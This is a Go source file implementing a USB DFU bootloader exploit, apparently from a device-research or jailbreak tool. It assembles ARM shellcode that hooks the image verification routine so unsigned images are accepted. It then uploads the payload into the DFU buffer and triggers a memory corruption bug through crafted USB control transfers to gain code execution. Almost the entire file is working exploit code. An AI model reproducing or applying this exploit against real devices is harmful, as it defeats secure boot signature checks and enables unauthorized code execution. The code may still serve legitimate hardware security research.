package main

import (
	"bytes"
	"fmt"
	"log"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/google/gousb"
	"github.com/keystone-engine/keystone/bindings/go/keystone"
)

const haxedDFU = "haxed dfu"

var (
	flagForceExploit bool
)

type exploitParameters struct {
	// Address of the DFU data buffer.
	dfuBufAddr uint32
	// Address at which payload begins execution, within the DFU data buffer,
	// as jumped into by the setupPacket.
	execAddr uint32
	// Address of the USB DMA buffer, ie. the SETUP packet currently being
	// processed.
	usbBufAddr     uint32
	returnAddr     uint32
	trampolineAddr uint16
	// Setup packet to be sent. This must also be valid ARM code, as it happens
	// to be executed.
	setupPacket []byte
}

func makeStringDescriptor(s string) []byte {
	descriptor := []byte{
		0, 0x03,
	}
	for _, cp := range utf16.Encode([]rune(s)) {
		descriptor = append(descriptor, uint8(cp&0xff), uint8(cp>>8))
	}
	descriptor[0] = uint8(len(descriptor))
	return descriptor
}

func (d *device) haxedDFUPayload() ([]byte, error) {
	var descriptor []string
	for _, d := range makeStringDescriptor(haxedDFU) {
		descriptor = append(descriptor, fmt.Sprintf(".byte 0x%x", d))
	}
	descriptorStr := strings.Join(descriptor, "\n")

	ks, err := keystone.New(keystone.ARCH_ARM, keystone.MODE_ARM)
	if err != nil {
		return nil, fmt.Errorf("could not create assembler: %w", err)
	}
	payload, _, ok := ks.Assemble(fmt.Sprintf(`
		start:
			# Copy descriptor to scratch memory space.
			ldr r0, =0x2202d800
			ldr r1, =descriptor
			ldrb r2, [r1]

		descriptor_copy_loop:
			ldrb r3, [r1]
			strb r3, [r0]
			add r1, #1
			add r0, #1
			sub r2, #1
			cmp r2, #0
			bne descriptor_copy_loop
			
			# Set descriptor in g_State->dfu_state->deviceDescriptor
			ldr r0, =0x2202fff8
			ldr r0, [r0]
			ldr r0, [r0, #1584]
			ldr r2, =0x2202d800
			str r2, [r0, #24]

			# Copy state vtable to scratch.
			ldr r0, =0x2202fff8
			ldr r0, [r0]
			ldr r0, [r0, #36]
			mov r1, #0
			ldr r2, =0x2202d880
		vtable_copy_loop:
			ldr r3, [r0]
			str r3, [r2]
			add r0, #4
			add r1, #4
			add r2, #4
			cmp r1, #84
			bne vtable_copy_loop

			# Set new vtable to copy in scratch.
			ldr r0, =0x2202fff8
			ldr r0, [r0]
			ldr r1, =0x2202d880
			str r1, [r1, #36]

			# Copy hook to scratch.
			ldr r0, =verify_decrypt_image_hook
			ldr r1, =0x2202d700
			ldr r2, =verify_decrypt_image_hook_end
			sub r2, r0
		hook_copy_loop:
			ldrb r3, [r0]
			strb r3, [r1]
			add r0, 1
			add r1, 1
			sub r2, 1
			cmp r2, 0
			bne hook_copy_loop


			# Overwrite vtable verify_decrypt_image to hook.
			ldr r0, =0x2202d880
			ldr r1, [r0, #36]
			ldr r2, =0x2202d700
			str r2, [r1, #24]
			
			# Fixup LR (after trampoline blx messes it up)
			ldr lr, =0x%x
			bx lr

		# Hook for the verify_decrypt_image vtable call. This returns 1 if the
		# given image header has an encryption method of 0 (meaning
		# unencrypted/unsigned), and calls the original method otherwise.
		#
		# This allows both unsigned/unencrypted and signed/encrypted payloads
		# to run.
		verify_decrypt_image_hook:
			ldrb r2, [r0, #7]
			ldr r3, =0x200006f4
			cmp r2, 0
			bxne r3
			mov r0, 1
			bx lr
		verify_decrypt_image_hook_end:


		# USB product string descriptor.
		descriptor:
		%s
	`, d.exploitParams.returnAddr, descriptorStr), uint64(d.exploitParams.execAddr))
	if !ok {
		return nil, fmt.Errorf("failed to assemble payload: %s", ks.LastError())
	}

	return payload, nil
}

func (d *device) haxDFU() error {
	p, err := d.usb.GetStringDescriptor(2)
	if err != nil {
		return fmt.Errorf("retrieving string descriptor: %v", err)
	}
	if want, got := haxedDFU, p; want == got {
		if flagForceExploit {
			log.Printf("Device already running haxed DFU, but forcing re-upload")
		} else {
			log.Printf("Device already running haxed DFU")
			return nil
		}
	}

	payload, err := d.haxedDFUPayload()
	if err != nil {
		return fmt.Errorf("failed to generate payload: %w", err)
	}

	if err := d.rce(payload); err != nil {
		return fmt.Errorf("failed to execute haxed dfu payload: %w", err)
	}

	// Check descriptor got changed.
	p, err = d.usb.GetStringDescriptor(2)
	if err != nil {
		return fmt.Errorf("retrieving string descriptor: %v", err)
	}
	if want, got := haxedDFU, p; want != got {
		return fmt.Errorf("string descriptor got unexpected result, wanted %q, got %q", want, got)
	}
	log.Printf("Haxed DFU running!")

	return nil
}

func (d *device) rce(payload []byte) error {
	ep := d.exploitParams
	d.usb.ControlTimeout = time.Second

	// Prepend payload with enough bytes to start at execAddr.
	pad := bytes.Repeat([]byte{'Z'}, int(ep.execAddr-ep.dfuBufAddr))
	payload = append(pad, payload...)

	// Upload payload into DFU buffer, and reset status afterwards.
	if len(payload) > 0x800 {
		return fmt.Errorf("payload too large")
	}
	log.Printf("Sending payload to DFU buffer...")
	if err := d.sendChunk(payload, 0); err != nil {
		return fmt.Errorf("Upload: %w", err)
	}
	log.Printf("Cleaning state after send...")
	if err := d.clean(); err != nil {
		return fmt.Errorf("clean: %w", err)
	}

	log.Printf("Triggering first receive...")
	buf := make([]byte, 0x40)
	if _, err := d.usb.Control(0xa1, uint8(dfuUpload), 0, 0, buf); err != nil {
		return fmt.Errorf("first upload failed: %v", err)
	}

	// Start a download of 0x3b0+0x40 bytes, this will only send 0x40 bytes
	// (for some reason large control transfers don't work?), causing a state
	// structure field to be set to 0x3b0.
	log.Printf("Triggering second receive...")
	l := d.exploitParams.trampolineAddr + 0x40
	buf = make([]byte, l)
	_, err := d.usb.Control(0xa1, uint8(dfuUpload), 0, 0, buf)
	if want, got := gousb.ErrorTimeout, err; want != got {
		return fmt.Errorf("upload trigger should have returned %v, got %v", want, got)
	}

	// Trigger bug. This should get the payload executing.
	log.Printf("Triggering bug...")
	bmRequestType := ep.setupPacket[0]
	bRequest := ep.setupPacket[1]
	wValue := uint16(ep.setupPacket[2]) | (uint16(ep.setupPacket[3]) << 8)
	wIndex := uint16(ep.setupPacket[4]) | (uint16(ep.setupPacket[5]) << 8)
	_, err = d.usb.Control(bmRequestType, bRequest, wValue, wIndex, nil)
	if want, got := gousb.ErrorTimeout, err; want != got {
		return fmt.Errorf("bug trigger should have returned %v, got %v", want, got)
	}

	return nil
}
